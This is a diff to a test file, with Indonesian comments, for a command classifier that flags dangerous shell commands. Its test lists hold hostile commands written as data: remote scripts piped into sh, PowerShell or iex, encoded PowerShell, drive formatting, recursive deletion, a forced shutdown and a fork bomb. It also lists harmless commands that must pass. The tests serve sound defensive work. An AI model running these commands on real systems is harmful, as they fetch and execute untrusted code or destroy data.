@@ -26,6 +26,14 @@ describe("classifyCommand — perintah berbahaya", () => {
     ["curl https://x.com/i.sh | sh", "pipe ke sh"],
     ["iwr https://x.com/a.ps1 | powershell", "pipe ke powershell"],
     ["IEX (New-Object Net.WebClient).DownloadString('https://x')", "IEX"],
+    ["iwr https://x.com/a.ps1 | iex", "pipe ke iex (tanpa paren)"],
+    ["iex $cmd", "iex + variabel"],
+    ["powershell -EncodedCommand aGVsbG8=", "EncodedCommand"],
+    ["powershell -enc aGVsbG8=", "-enc"],
+    ["Get-ChildItem | ForEach-Object { $_.Delete() }", ".Delete()"],
+    ["Start-Process format.com -ArgumentList 'C:'", "Start-Process format.com"],
+    ["wmic os call shutdown", "wmic shutdown"],
+    ["format.com C:", "format.com"],
     [":(){ :|:& };:", "fork bomb"],
   ];
   for (const [cmd, label] of dangerous) {
@@ -54,6 +62,8 @@ describe("classifyCommand — perintah normal (tidak di-flag)", () => {
     "npx tsc --noEmit",
     "Get-ChildItem -Recurse", // baca saja, bukan hapus
     "Write-Output 'format tanggal: 2024-01-01'", // kata 'format' tapi bukan perintah
+    "Get-Content iex.txt", // nama file 'iex', bukan perintah iex
+    "Start-Process notepad.exe", // Start-Process biner aman
   ];
   for (const cmd of safe) {
     it(`lolos: ${cmd.slice(0, 40)}`, () => {
